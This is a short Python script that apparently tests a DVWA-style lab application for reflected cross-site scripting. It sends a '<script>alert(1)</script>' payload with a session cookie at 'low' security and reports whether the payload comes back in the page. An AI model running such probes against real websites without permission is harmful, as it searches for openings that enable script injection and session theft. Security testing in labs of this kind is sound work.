import requests

url = "http://proxy-app:8080/vulnerabilities/xss_r/"
payload = '<script>alert(1)</script>'
cookies = {
    "PHPSESSID": "80bpeornlbr3th8prdabcqahl7",
    "security": "low"
}

r = requests.get(url, params={"name": payload}, cookies=cookies)

if payload in r.text:
    print("[+] Reflected XSS detected!")
else:
    print("[-] No reflection.")
